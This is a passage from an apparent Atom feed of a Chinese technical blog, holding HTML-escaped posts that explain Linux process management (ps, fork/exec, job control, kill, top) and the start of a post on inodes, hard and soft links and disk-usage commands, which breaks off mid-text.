&lt;li&gt;&lt;a href=&quot;http://blog.csdn.net/morewindows/article/details/7370155&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;MoreWindows-STL系列之十 全排列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.cnblogs.com/lifegoesonitself/p/3225803.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;java 全组合 与全排列&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;-EOF-&lt;/p&gt;
</content>
    
    <summary type="html">
    
      记得 @老赵 之前在微博上吐槽说，“有的人真是毫无长进，六年前某同事不会写程序输出全排列，昨天发邮件还是问我该怎么写，这时间浪费到我都看不下去了。” 那时候就很好奇全排列到底是什么东西，到底有多难？今天复习的时候终于碰到这题了，结果果然自己太渣，看了好久都没明白，代码实现又是磕磕碰碰的。所以，就把它整理成笔记加深记忆，也希望能帮到和我一样的人。
    
    </summary>
    
      <category term="程序设计" scheme="http://wuchong.me/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    
      <category term="面试" scheme="http://wuchong.me/tags/%E9%9D%A2%E8%AF%95/"/>
    
      <category term="全排列" scheme="http://wuchong.me/tags/%E5%85%A8%E6%8E%92%E5%88%97/"/>
    
      <category term="全组合" scheme="http://wuchong.me/tags/%E5%85%A8%E7%BB%84%E5%90%88/"/>
    
  </entry>
  
  <entry>
    <title>Linux基础：进程管理</title>
    <link href="http://wuchong.me/blog/2014/07/24/linux-process-manage/"/>
    <id>http://wuchong.me/blog/2014/07/24/linux-process-manage/</id>
    <published>2014-07-24T03:48:11.000Z</published>
    <updated>2016-03-08T12:15:16.000Z</updated>
    
    <content type="html">&lt;p&gt;进程是操作系统上非常重要的概念，所有系统上面跑的数据都会以进程的类型存在。在 Linux 系统当中：触发任何一个事件时，系统都会将它定义成为一个进程，并且给予这个进程一个 ID，称为 PID，同时根据触发这个进程的用户，给予这个 PID 一组有效的权限设置。&lt;/p&gt;
&lt;h2 id=&quot;进程是什么样的&quot;&gt;&lt;a href=&quot;#进程是什么样的&quot; class=&quot;headerlink&quot; title=&quot;进程是什么样的&quot;&gt;&lt;/a&gt;进程是什么样的&lt;/h2&gt;&lt;p&gt;程序运行起来后，我们看不到也摸不着。因此 Linux 为我们提供了一系列方便的命名来查看正在运行的进程。首先是 ps 命令，比如 &lt;code&gt;ps -l&lt;/code&gt;命令能查看当前 bash 下的相关进程全部信息。如下：&lt;br&gt;&lt;figure class=&quot;highlight cos&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ ps -&lt;span class=&quot;keyword&quot;&gt;l&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;F &lt;span class=&quot;keyword&quot;&gt;S&lt;/span&gt;   UID   PID  PPID  C PRI  NI ADDR SZ WCHAN  TTY          TIME CMD&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;S&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;1000&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;2552&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;2538&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;80&lt;/span&gt;   &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; -  &lt;span class=&quot;number&quot;&gt;1945&lt;/span&gt; wait   pts/&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;    &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;00&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; bash&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;S&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;1000&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;9352&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;2552&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;80&lt;/span&gt;   &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; -  &lt;span class=&quot;number&quot;&gt;1926&lt;/span&gt; wait   pts/&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;    &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;00&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; bash&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;R&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;1000&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;9478&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;9352&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;80&lt;/span&gt;   &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; -  &lt;span class=&quot;number&quot;&gt;1598&lt;/span&gt; -      pts/&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;    &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;00&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; ps&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;另外，我们还可以用 &lt;code&gt;pstree&lt;/code&gt; 命令来显示整棵进程树。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww3.sinaimg.cn/large/81b78497jw1einn18zdbaj20k50bign9.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;可以看到这里 init 进程是所有进程的根节点，使用&lt;code&gt;ps&lt;/code&gt;命令还能看到 init 的 PID 为 1 。当&lt;a href=&quot;http://wuchong.me/blog/2014/07/14/linux-boot-process/&quot;&gt;Linux启动&lt;/a&gt;的时候，init 是系统创建的第一个进程，这一进程会一直存在，直到我们关闭计算机。所有其他的进程都是由 init 进程衍生出来的。&lt;/p&gt;
&lt;h2 id=&quot;父进程-amp-子进程&quot;&gt;&lt;a href=&quot;#父进程-amp-子进程&quot; class=&quot;headerlink&quot; title=&quot;父进程 &amp;amp; 子进程&quot;&gt;&lt;/a&gt;父进程 &amp;amp; 子进程&lt;/h2&gt;&lt;p&gt;上面提到所谓的“衍生出来的进程”正是 Linux 的父子进程的概念。当我们登录系统后，会取得一个 bash shell，然后我们利用这个 bash 提供的接口去执行另一个命令，例如 &lt;code&gt;bash&lt;/code&gt; 或者 &lt;code&gt;ps&lt;/code&gt; 等。那些另外执行的命令也会被触发成为 PID，那个后来执行的命令产生的 PID 就是“子进程”，而原本的 bash 环境下，就称为“父进程”了。&lt;/p&gt;
&lt;p&gt;老进程成为新进程的父进程（parent process），而相应的，新进程就是老的进程的子进程（child process）。一个进程除了有一个PID之外，还会有一个PPID（parent PID）来存储的父进程 PID。如果我们循着 PPID 不断向上追溯的话，总会发现其源头是 init 进程。所以说，所有的进程也构成一个以 init 为根的树状结构。&lt;/p&gt;
&lt;p&gt;我们使用 &lt;code&gt;ps -o&lt;/code&gt; 命令来看一看现有的进程。&lt;/p&gt;
&lt;figure class=&quot;highlight armasm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ ps -o pid,ppid,comm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; PID  PPID COMMAND&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;2552&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;2538&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;bash&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;9352&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;2552&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;bash&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;9625&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;9352&lt;/span&gt; ps&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我所做的操作是在原来的 bash shell 中执行了 bash 命令，然后又执行了 ps 命令。我们可以看到，第二个进程 bash 是第一个进程 bash 的子进程，而第三个进程ps是第二个进程的子进程。&lt;/p&gt;
&lt;h2 id=&quot;fork-amp-exec&quot;&gt;&lt;a href=&quot;#fork-amp-exec&quot; class=&quot;headerlink&quot; title=&quot;fork &amp;amp; exec&quot;&gt;&lt;/a&gt;fork &amp;amp; exec&lt;/h2&gt;&lt;p&gt;当计算机开机的时候，内核（kernel）只建立了一个 init 进程。Linux kernel 并不提供直接建立新进程的系统调用。剩下的所有进程都是 init 进程通过 fork 机制建立的。新的进程要通过老的进程复制自身得到，这就是 fork。fork 是一个系统调用。进程存活于内存中。每个进程都在内存中分配有属于自己的一片空间 (内存空间，包含栈、堆、全局静态区、文本常量区、程序代码区)。当一个程序调用 fork 的时候，实际上就是将上面的内存空间，又复制出来一个，构成一个新的进程，并在内核中为该进程创建新的附加信息 (比如新的 PID，而 PPID 为原进程的 PID)。此后，两个进程分别地继续运行下去。新的进程和原有进程有相同的运行状态(相同的变量值，相同的指令…)。我们只能通过进程的附加信息来区分两者。&lt;br&gt;程序调用 exec 的时候，进程清空自身的内存空间，并根据新的程序文件重建程序代码、文本常量、全局静态、堆和栈(此时堆和栈大小都为 0)，并开始运行。&lt;/p&gt;
&lt;h2 id=&quot;工作管理&quot;&gt;&lt;a href=&quot;#工作管理&quot; class=&quot;headerlink&quot; title=&quot;工作管理&quot;&gt;&lt;/a&gt;工作管理&lt;/h2&gt;&lt;p&gt;这个工作管理（job control）是用在 bash 环境下的，也就是说，当我们登录系统取得 bash shell 之后，在单一终端机下可以同时进行多个工作的行为管理。&lt;/p&gt;
&lt;p&gt;假如我们只有一个终端，因此在可以出现提示符让你操作的环境就成为前台（foreground），至于其他工作就可以放在后台（background）去暂停或运行。&lt;/p&gt;
&lt;p&gt;工作管理的意义在于将多个工作囊括在一个终端，并取其中的一个工作作为前台，来直接接收该终端的输入输出以及终端信号。 其他工作在后台运行。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;直接将命令丢到后台执行：&lt;code&gt;&amp;amp;&lt;/code&gt;&lt;/p&gt;
  &lt;figure class=&quot;highlight xquery&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ping localhost &amp;gt; log &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;  此时终端显示:&lt;/p&gt;
  &lt;figure class=&quot;highlight json&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] &lt;span class=&quot;number&quot;&gt;9800&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;  括号中的 1 表示工作号，而 9800 为 PID&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;将目前的工作丢到后台中“暂停”： &lt;code&gt;[ctrl]+z&lt;/code&gt;&lt;/p&gt;
  &lt;figure class=&quot;highlight xquery&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$vim ~/.bashrc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;  在vim的普通模式下，按下&lt;code&gt;[ctrl]+z&lt;/code&gt;的组合键&lt;/p&gt;
  &lt;figure class=&quot;highlight accesslog&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;[2]&lt;/span&gt;+  已停止               vim ~/.bashrc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;查看目前的后台工作状态：&lt;code&gt;jobs&lt;/code&gt;&lt;br&gt;  其各个参数的含义如下&lt;br&gt;  -l ：同时列出PID的号码&lt;br&gt;  -r：仅列出正在后台run的工作&lt;br&gt;  -s：仅列出在后台stop的工作&lt;/p&gt;
&lt;p&gt;  例如我们执行&lt;/p&gt;
  &lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ &lt;span class=&quot;built_in&quot;&gt;jobs&lt;/span&gt; &lt;span class=&quot;_&quot;&gt;-l&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[1]-  9800 运行中               ping localhost &amp;gt; &lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt; &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[2]+  9905 停止                  vim ~/.bashrc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;  能看到目前有多少个工作在后台中，并且能看到这些工作的 PID。紧跟在 job number 后面的 &lt;code&gt;+&lt;/code&gt; 代表最近放到后台的工作，&lt;code&gt;-&lt;/code&gt; 代表最近最后第二个放到后台的工作，直接执行&lt;code&gt;fg&lt;/code&gt;的话会先取&lt;code&gt;+&lt;/code&gt;的&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;将后台工作拿到前台来处理：&lt;code&gt;fg %jobnumber&lt;/code&gt;&lt;/p&gt;
  &lt;figure class=&quot;highlight xquery&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$cat &amp;gt; log &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$fg &lt;span class=&quot;meta&quot;&gt;%1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;  当我们运行第一个命令后，由于工作在后台，我们无法对命令进行输入，直到我们将工作带入前台，才能向 cat 命令输入。在输入完成后，按下 CTRL+D 来通知 shell 输入结束。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;让工作在后台下的状态变成运行中：&lt;code&gt;bg %jobnumber&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;管理后台工作中的工作：&lt;code&gt;kill&lt;/code&gt;&lt;br&gt;  信号可以通过 kill 传递给进程，信号值以下三个比较重要。&lt;br&gt;  -1  重新加载 （SIGHUP）&lt;br&gt;  -9  立刻删除 （SIGKILL）&lt;br&gt;  -15  正常终止（SIGTERM）&lt;/p&gt;
&lt;p&gt;  可以使用 &lt;/p&gt;
  &lt;figure class=&quot;highlight xquery&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$kill -SIGTERM &lt;span class=&quot;number&quot;&gt;9800&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;  或者&lt;/p&gt;
  &lt;figure class=&quot;highlight xquery&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$kill -&lt;span class=&quot;number&quot;&gt;15&lt;/span&gt;  &lt;span class=&quot;meta&quot;&gt;%1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;  的方式来发送给工作。上面的两个命令，一个是发送给信号给 PID 9800 ，一个是发送信号值给工作号1，两者等价。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;监控进程的变化：&lt;code&gt;top&lt;/code&gt;&lt;br&gt;  top 是一个很不错的程序查看工具，但不同于 ps 的静态结果输出，top 可以持续监测整个系统的进程工作状态，而且功能非常丰富，可以在 top 中输入&lt;code&gt;?&lt;/code&gt;查看更多功能按键。常用的有 &lt;code&gt;P&lt;/code&gt; 以CPU使用资源排序，&lt;code&gt;M&lt;/code&gt;以物理内存使用排序。&lt;/p&gt;
&lt;p&gt;  常用的参数有 &lt;code&gt;-d&lt;/code&gt; 可以修改进程界面更新的秒数，&lt;code&gt;-p&lt;/code&gt;可以指定某些个 PID 来进行查看监测。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;参考资料&quot;&gt;&lt;a href=&quot;#参考资料&quot; class=&quot;headerlink&quot; title=&quot;参考资料&quot;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://book.douban.com/subject/4889838/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;鸟哥的Linux私房菜.基础学习篇&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;-EOF-&lt;/p&gt;
</content>
    
    <summary type="html">
    
      进程是操作系统上非常重要的概念，所有系统上面跑的数据都会以进程的类型存在。在 Linux 系统当中：触发任何一个事件时，系统都会将它定义成为一个进程，并且给予这个进程一个 ID，称为 PID，同时根据触发这个进程的用户，给予这个 PID 一组有效的权限设置。
    
    </summary>
    
      <category term="Linux/Unix" scheme="http://wuchong.me/categories/Linux-Unix/"/>
    
    
      <category term="Linux基础" scheme="http://wuchong.me/tags/Linux%E5%9F%BA%E7%A1%80/"/>
    
      <category term="进程" scheme="http://wuchong.me/tags/%E8%BF%9B%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Linux基础：文件管理</title>
    <link href="http://wuchong.me/blog/2014/07/21/linux-file-manage/"/>
    <id>http://wuchong.me/blog/2014/07/21/linux-file-manage/</id>
    <published>2014-07-21T09:44:19.000Z</published>
    <updated>2016-03-08T12:14:29.000Z</updated>
    
    <content type="html">&lt;p&gt;在 Linux 下，所有的文件与目录都是由根目录（/）开始的。然后再一个一个分支下来，形成一棵繁杂的树。因此我们也称这种目录配置方式为“目录树”。那目录树与文件系统有什么关系，目录树是怎么实现的呢？&lt;/p&gt;
&lt;h2 id=&quot;目录&quot;&gt;&lt;a href=&quot;#目录&quot; class=&quot;headerlink&quot; title=&quot;目录&quot;&gt;&lt;/a&gt;目录&lt;/h2&gt;&lt;p&gt;在 Linux 系统中，目录也是一种文件。我们可以使用 &lt;code&gt;$ls -li&lt;/code&gt;来查看一个目录的属性。&lt;/p&gt;
&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$ls&lt;/span&gt; -&lt;span class=&quot;selector-tag&quot;&gt;li&lt;/span&gt;  /home/wuchong&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;141494&lt;/span&gt;  drwxr-xr-x &lt;span class=&quot;number&quot;&gt;18&lt;/span&gt; wuchong wuchong    &lt;span class=&quot;number&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;月  &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;2013&lt;/span&gt; hadoop-&lt;span class=&quot;number&quot;&gt;1.1&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1715845&lt;/span&gt; drwxrwxr-x  &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; wuchong wuchong    &lt;span class=&quot;number&quot;&gt;4096&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;月 &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;09&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;input&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1718481&lt;/span&gt; -rw-rw-r--  &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; wuchong wuchong       &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;月 &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;11&lt;/span&gt; test&lt;span class=&quot;selector-class&quot;&gt;.txt&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1718478&lt;/span&gt; -rw-r--r--  &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; root    root    &lt;span class=&quot;number&quot;&gt;1780292&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;月 &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;19&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;04&lt;/span&gt; etc&lt;span class=&quot;selector-class&quot;&gt;.jar&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.bz2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;……&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;其中&lt;code&gt;-i&lt;/code&gt;参数是显示文件的 inode 号。可以看到第一列就是目录/文件的 inode 号。因此 ext 文件系统对于目录也会像对待文件一样分配其 inode 块和 block 块。只不过，在目录中 inode 块记录的是该目录的相关权限与属性以及分配到的 block 块号码，而 block 则记录的是这个目录下的/&lt;strong&gt;文件名&lt;/strong&gt;/与该文件名占用的 inode 号码数据。&lt;/p&gt;
&lt;p&gt;没错，在 Linux 中文件的 inode 中是不记录文件名的，文件名是记录在目录的 block 中。因此在新增/删除/重命名文件的时候，与目录的w权限有关。另一个直观的感受就是，你可以对正在使用的文件改名，换目录，甚至放到废纸篓，都不会影响当前文件的使用，这在 Windows 里是无法想象的。比如你打开个 Word 文件，然后对其进行重命名操作，Windows 会告诉你先给我关闭文件！&lt;/p&gt;
&lt;p&gt;当我们读取一个文件时，实际上是在目录中找到了这个文件的 inode 编号，然后根据 inode 中的 block 指针，把各个 block 数据块组合起来，放入内存供进一步的处理。当我们写入一个文件时，是分配一个空白inode给该文件，将其inode编号记入该文件所属的目录，然后选取空白的数据块，让inode的指针指像这些数据块，并放入内存中的数据。&lt;/p&gt;
&lt;h2 id=&quot;硬链接与软链接&quot;&gt;&lt;a href=&quot;#硬链接与软链接&quot; class=&quot;headerlink&quot; title=&quot;硬链接与软链接&quot;&gt;&lt;/a&gt;硬链接与软链接&lt;/h2&gt;&lt;p&gt;当文件出现在一个目录文件中时，我们就把文件接入到文件系统中（在目录中写入该文件的文件名和 inode 号），我们称建立一个到文件的硬链接（hard link）。一个文件允许出现在多个目录中，这样，它就有多个硬链接。当硬链接的数目（link count）降为0时，文件会被 Linux 删除。所以很多时候，unlink 与 remove 在 Linux 操作系统中是一个意思。引入硬链接的目的是为了“安全”，如果你将任何一个“文件名”删除，其实 inode 与 block 都还是存在的。此时可以通过另一个“文件名”来读取到正确的文件数据。此外，不论你使用哪个“文件名”来编辑，最终的结果都会写入到相同的 inode 与 block 中，因此均能进行数据的修改。&lt;/p&gt;
&lt;p&gt;至于软链接（soft link），其实就是 Windows 上的快捷方式。基本上，软链接就是在创建一个新的独立的文件，而这个文件会让数据的读取指向它连接的那个文件的文件名。由于只是利用文件来作为指向的操作，所以，当源文件被删除后，软链接的文件会打不开。由于软链接（soft link）的广泛使用不会影响 link count，而且可以跨越文件系统，现在较少手动建立硬连接。&lt;/p&gt;
&lt;p&gt;创建硬链接与软链接使用 ln 命令即可。&lt;br&gt;&lt;figure class=&quot;highlight xquery&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ln [-s] 源文件 目标文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-s : 如果不加任何参数就是硬链接，加上 -s 就是软链接&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;~$ln -s /etc/crontab .    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;~$ln /etc/crontab crontab2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;~$ ll -i /etc/crontab ~/crontab ~/crontab2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1310870&lt;/span&gt; -rw-r--r-- &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; root    root    &lt;span class=&quot;number&quot;&gt;722&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;月 &lt;span class=&quot;number&quot;&gt;15&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;2012&lt;/span&gt; /etc/crontab&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1310870&lt;/span&gt; -rw-r--r-- &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; root    root    &lt;span class=&quot;number&quot;&gt;722&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;月 &lt;span class=&quot;number&quot;&gt;15&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;2012&lt;/span&gt; /home/wuchong/crontab2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1718696&lt;/span&gt; lrwxrwxrwx &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; wuchong wuchong  &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;月 &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;42&lt;/span&gt; /home/wuchong/crontab -&amp;gt; /etc/crontab&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可以看到硬链接文件的 inode 是同一个，并且连接数变成了 2。而软链接是一个新的文件，拥有自己的 inode 号。&lt;/p&gt;
&lt;h2 id=&quot;文件系统管理命令&quot;&gt;&lt;a href=&quot;#文件系统管理命令&quot; class=&quot;headerlink&quot; title=&quot;文件系统管理命令&quot;&gt;&lt;/a&gt;文件系统管理命令&lt;/h2&gt;&lt;figure class=&quot;highlight xquery&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$df  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;列出文件系统的整体磁盘使用量&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-h  以人们容易阅读的 GB MB KB 等格式自行显示&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-i  不使用硬盘容量，而以 inode 的数量显示&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$du file/dir&lt;/span&gt;&lt;br&gt;&lt;span 